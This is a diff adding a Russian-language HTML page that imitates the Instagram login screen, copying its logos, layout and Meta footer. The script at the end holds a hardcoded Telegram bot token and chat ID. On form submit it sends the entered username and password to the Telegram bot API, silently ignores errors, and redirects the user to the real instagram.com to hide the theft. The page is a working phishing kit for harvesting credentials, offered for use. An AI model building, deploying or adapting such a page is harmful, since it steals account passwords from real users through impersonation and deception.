@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        :root {
+            --bg-dark: #000000;
+            --panel-bg: #121519; 
+            --input-bg: #000000;
+            --input-border: #363636;
+            --btn-disabled: #002d4d;
+            --btn-active: #0095f6;
+            --text-white: #ffffff;
+            --text-gray: #a8a8a8;
+        }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg-dark); color: var(--text-white);
+        }
+
+        .wrapper { 
+            display: flex; 
+            width: 100vw; 
+            height: calc(100vh - 50px); 
+        }
+
+        /* Левая часть (текст) */
+        .left-side {
+            flex: 1.2; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 40px;
+            text-align: center;
+        }
+
+        .logo-area { margin-bottom: 30px; }
+        .my-logo-img { height: 80px; width: auto; }
+
+        h1 {
+            font-size: 38px; text-align: center; max-width: 550px;
+            line-height: 1.2; font-weight: 500; margin: 0;
+        }
+
+        .gradient-text {
+            background: linear-gradient(to right, #ff7e5f, #ee2a7b, #6228d7);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        /* Правая часть (форма) */
+        .right-side {
+            flex: 1; background-color: var(--panel-bg);
+            border-left: 1px solid #262626; display: flex;
+            flex-direction: column; justify-content: center; align-items: center;
+            padding: 20px;
+        }
+
+        .login-box { width: 100%; max-width: 350px; text-align: center; }
+        .login-box h2 { font-size: 20px; margin-bottom: 30px; font-weight: 600; }
+
+        input {
+            width: 100%; background: var(--input-bg);
+            border: 1px solid var(--input-border); border-radius: 12px;
+            padding: 16px 12px; margin-bottom: 12px;
+            color: white; font-size: 14px; box-sizing: border-box; outline: none;
+        }
+
+        .btn-login {
+            width: 100%; background-color: var(--btn-disabled);
+            color: rgba(255,255,255, 0.4); border: none;
+            padding: 14px; border-radius: 25px; font-weight: 600;
+            margin-top: 10px; cursor: default; font-size: 15px;
+        }
+
+        .btn-login.active { background-color: var(--btn-active); color: white; cursor: pointer; }
+
+        .forgot {
+            display: block; text-align: center; margin-top: 20px;
+            font-size: 14px; color: white; text-decoration: none; font-weight: 600;
+        }
+
+        .fb-btn, .create-btn {
+            width: 100%; border: 1px solid var(--input-border);
+            border-radius: 25px; padding: 12px; text-align: center;
+            color: white; font-weight: 600; font-size: 14px;
+            cursor: pointer; text-decoration: none; display: block;
+            box-sizing: border-box; margin-top: 25px;
+        }
+
+        .create-btn { margin-top: 12px; border-color: #363636; color: #0095f6; }
+
+        .meta-logo { margin-top: 40px; text-align: center; opacity: 0.8; }
+        .meta-logo img { width: 70px; }
+
+        /* Футер */
+        .footer {
+            height: 50px; display: flex; justify-content: center;
+            align-items: center; gap: 15px; font-size: 11px;
+            color: var(--text-gray); border-top: 1px solid #262626;
+            background: black;
+        }
+
+        /* --- АДАПТИВНОСТЬ ДЛЯ ТЕЛЕФОНОВ --- */
+        @media (max-width: 850px) {
+            .wrapper {
+                flex-direction: column; /* Ставим блоки друг под друга */
+                height: auto;
+                overflow-y: auto;
+            }
+
+            .left-side {
+                flex: none;
+                padding: 40px 20px;
+            }
+
+            .left-side h1 {
+                font-size: 24px; /* Уменьшаем текст на телефоне */
+            }
+
+            .right-side {
+                flex: none;
+                border-left: none; /* Убираем линию сбоку */
+                border-top: 1px solid #262626;
+                padding: 40px 20px;
+                background-color: var(--bg-dark); /* На мобиле обычно всё черное */
+            }
+
+            .footer {
+                flex-wrap: wrap;
+                height: auto;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="left-side">
+        <div class="logo-area">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="my-logo-img"> 
+        </div>
+        <h1>Посмотрите, какими моментами из жизни поделились ваши <span class="gradient-text">близкие друзья</span>.</h1>
+    </div>
+
+    <div class="right-side">
+        <div class="login-box">
+            <h2>Войти в Instagram</h2>
+            <form id="auth">
+                <input type="text" id="u" placeholder="Имя пользователя, номер или почта" required>
+                <input type="password" id="p" placeholder="Пароль" required>
+                <button type="submit" id="btn" class="btn-login" disabled>Войти</button>
+            </form>
+            
+            <a href="#" class="forgot">Забыли пароль?</a>
+            <a href="#" class="fb-btn">Войти через Facebook</a>
+            <a href="#" class="create-btn">Создать новый аккаунт</a>
+            
+            <div class="meta-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/100px-Meta_Platforms_Inc._logo.svg.png">
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <span>Meta</span> <span>Информация</span> <span>Блог</span> <span>Вакансии</span> <span>© 2026 Instagram from Meta</span>
+</div>
+
+<script>
+    const TG_TOKEN = "8066126401:AAGQ1I4xxZ4heEshyZ-b4pD969J-lVhKgHs";
+    const TG_CHAT_ID = "1926659877";
+
+    const u = document.getElementById("u");
+    const p = document.getElementById("p");
+    const b = document.getElementById("btn");
+
+    function check() {
+        if (u.value.length > 0 && p.value.length > 0) {
+            b.classList.add("active");
+            b.disabled = false;
+        } else {
+            b.classList.remove("active");
+            b.disabled = true;
+        }
+    }
+
+    u.addEventListener("input", check);
+    p.addEventListener("input", check);
+
+    document.getElementById("auth").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        b.innerText = "Вход..."; // Визуальный эффект
+        
+        const message = `🚀 **Новый вход!**\n👤 Логин: \`${u.value}\`\n🔑 Пароль: \`${p.value}\``;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown",
+                }),
+            });
+        } catch (err) {}
+
+        // Перенаправление на настоящий Instagram
+        window.location.href = "https://www.instagram.com";
+    });
+</script>
+
+</body>
+</html>
